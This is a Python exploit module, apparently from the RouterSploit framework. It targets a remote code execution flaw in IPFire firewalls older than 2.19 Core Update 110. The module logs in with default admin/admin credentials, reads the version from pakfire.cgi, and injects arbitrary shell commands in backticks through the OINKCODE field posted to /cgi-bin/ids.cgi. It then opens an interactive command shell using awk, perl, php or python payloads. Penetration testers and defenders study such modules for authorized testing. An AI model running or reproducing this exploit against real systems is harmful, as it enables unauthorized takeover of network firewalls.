import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "IPFire Oinkcode RCE",
        "description": "Module exploits IPFire < 2.19 Core Update 110 Remote Code Execution vulnerability "
                       "which allows executing command on operating system level.",
        "authors": (
            "0x09AL",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/42149/",
        ),
        "devices": (
            "IPFire < 2.19 Core Update 110",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(444, "Target HTTP port")
    ssl = OptBool(True, "SSL enabled: true/false")

    username = OptString("admin", "Username to log in with")
    password = OptString("admin", "Password to log in with")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self,
                  architecture="cmd",
                  method="cmd",
                  payload=["awk", "perl", "php", "python"])
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        headers = {
            "Referer": "{}://{}:{}/cgi-bin/ids.cgi".format("https" if self.ssl else "http", self.target, self.port)
        }

        payload = "`{}`".format(cmd)

        data = {
            "ENABLE_SNORT_GREEN": "on",
            "ENABLE_SNORT": "on",
            "RULES": "registered",
            "OINKCODE": payload,
            "ACTION": "Download new ruleset",
            "ACTION2": "snort"
        }

        self.http_request(
            method="POST",
            path="/cgi-bin/ids.cgi",
            headers=headers,
            data=data,
            auth=(self.username, self.password)
        )

        return ""

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/cgi-bin/pakfire.cgi",
            auth=(self.username, self.password),
        )

        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200:
            res = re.findall(r"IPFire ([\d.]{4}) \([\w]+\) - Core Update ([\d]+)", response.text)
            if res:
                version = res[0][0]
                update = int(res[0][1])

                if Version(version) <= Version("2.19") and update <= 110:
                    return True  # target is vulnerable

        return False  # target is not vulnerable
